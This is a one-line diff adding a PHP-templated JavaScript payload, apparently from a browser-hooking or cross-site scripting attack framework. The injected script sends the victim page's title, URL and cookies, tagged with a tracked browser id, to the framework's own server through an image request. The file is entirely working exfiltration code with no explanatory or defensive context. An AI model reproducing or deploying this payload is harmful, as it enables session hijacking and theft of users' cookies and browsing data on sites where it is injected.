@@ -1,0 +1,1 @@
+(function() {(new Image()).src=<?php echo '"'.SITE_ROOT."?bid={$browser->bid}"."&a=info&title=\""?>+escape((function(){try{return document.title}catch(e){return ''}})())+"&url="+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})());})();
